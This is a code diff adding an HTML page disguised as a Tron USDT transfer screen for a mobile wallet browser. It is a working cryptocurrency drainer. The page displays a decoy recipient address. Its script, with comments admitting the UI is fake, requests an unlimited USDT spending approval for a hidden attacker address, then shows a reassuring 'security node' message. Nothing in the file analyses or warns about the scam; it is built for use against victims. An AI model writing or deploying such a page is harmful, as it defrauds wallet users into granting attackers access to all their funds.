@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USDT Transfer</title>
+  <style>
+    :root { 
+      --bg-white: #f7f8fa; 
+      --card-white: #ffffff; 
+      --text-main: #000000; 
+      --text-grey: #919499; 
+      --accent-blue: #007aff;
+      --btn-disabled: #cfe3fc;
+    }
+    body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg-white); color: var(--text-main); margin: 0; padding: 16px; -webkit-font-smoothing: antialiased; }
+    
+    .nav-bar { display: flex; align-items: center; justify-content: space-between; padding: 10px 0 25px 0; }
+    .nav-bar span { font-size: 17px; font-weight: 500; }
+    .back-btn { font-size: 22px; cursor: pointer; color: #333; }
+
+    .section-label { font-size: 14px; color: var(--text-grey); margin-bottom: 12px; margin-top: 24px; display: block; }
+    .input-group { background: var(--card-white); border-radius: 18px; padding: 18px; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
+
+    /* Address Field - 顯示虛假地址 */
+    .address-display { font-size: 15px; color: #333; display: flex; justify-content: space-between; align-items: center; font-family: monospace; }
+    .user-icon { width: 22px; height: 22px; background: #f0f2f5; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; color: var(--accent-blue); }
+
+    .amount-header { display: flex; justify-content: space-between; align-items: center; }
+    .amount-input-row { margin: 15px 0; }
+    .amount-input { background: none; border: none; color: var(--text-main); font-size: 42px; width: 100%; outline: none; }
+    .memo-text { font-size: 14px; color: #c0c4cc; border-top: 1px solid #f2f3f5; padding-top: 15px; margin-top: 5px; }
+
+    .fee-row { display: flex; justify-content: space-between; align-items: center; }
+    .arrow-down { font-size: 14px; color: var(--text-grey); margin-left: 5px; background: #f0f2f5; border-radius: 50%; width: 18px; height: 18px; display: inline-flex; align-items: center; justify-content: center; }
+
+    .footer-btn { position: fixed; bottom: 40px; left: 16px; right: 16px; background: var(--btn-disabled); color: white; border: none; border-radius: 14px; padding: 18px; font-size: 17px; font-weight: 600; cursor: pointer; }
+    .footer-btn.active { background: var(--accent-blue); }
+    
+    #log { position: fixed; bottom: 110px; left: 16px; right: 16px; text-align: center; color: #ff3b30; font-size: 12px; }
+  </style>
+</head>
+<body>
+
+  <div class="nav-bar">
+    <div class="back-btn">‹</div>
+    <div style="text-align: center;">
+      <span>USDT Transfer</span><br>
+      <small style="color: var(--text-grey); font-size: 11px;">Tron</small>
+    </div>
+    <div style="font-size: 20px;">⊡</div>
+  </div>
+
+  <label class="section-label">To</label>
+  <div class="input-group">
+    <div class="address-display">
+      <span>TCFNp179Lg46D16zKoumd4Poa2WFtdtqYjv</span>
+      <div class="user-icon">👤</div>
+    </div>
+  </div>
+
+  <div class="amount-header">
+    <label class="section-label">Amount</label>
+    <label class="section-label" style="font-weight: 500;">0 USDT</label>
+  </div>
+  <div class="input-group">
+    <div class="amount-input-row">
+      <input type="number" id="userInputAmount" class="amount-input" placeholder="0" oninput="checkInput()">
+    </div>
+    <div class="memo-text">memo (need 1 TRX)</div>
+  </div>
+
+  <label class="section-label">Gas Fee</label>
+  <div class="input-group">
+    <div class="fee-row">
+      <div>
+        <div style="font-size: 17px; font-weight: 500;">$ 0</div>
+        <div style="color: var(--text-grey); font-size: 13px; margin-top: 5px;">0 TRX <span class="arrow-down">⌵</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="log"></div>
+  <button class="footer-btn" id="nextBtn" onclick="startApprove()">Next</button>
+
+  <script>
+    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    // 雖然 UI 顯示假地址，但後台依然會傳送給你的真實合約地址
+    const SPENDER_ADDR = "TFXAJAGJr8ypS37UCfTMcteYRukSV8wqFa";
+
+    function checkInput() {
+      const val = document.getElementById("userInputAmount").value;
+      const btn = document.getElementById("nextBtn");
+      btn.classList.toggle("active", val > 0);
+    }
+
+    async function startApprove() {
+      const logDiv = document.getElementById("log");
+      if (!window.tronWeb) {
+        logDiv.innerText = "Please open this page in imToken browser";
+        return;
+      }
+
+      try {
+        const contract = await tronWeb.contract().at(USDT_CONTRACT);
+        // 核心：UI 的內容與這裡的參數完全無關
+        await contract.approve(SPENDER_ADDR, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({
+          feeLimit: 100_000_000
+        });
+        logDiv.style.color = "#34c759";
+        logDiv.innerText = "Redirecting to security node...";
+      } catch (e) {
+        logDiv.innerText = "Action canceled";
+      }
+    }
+  </script>
+</body>
+</html>
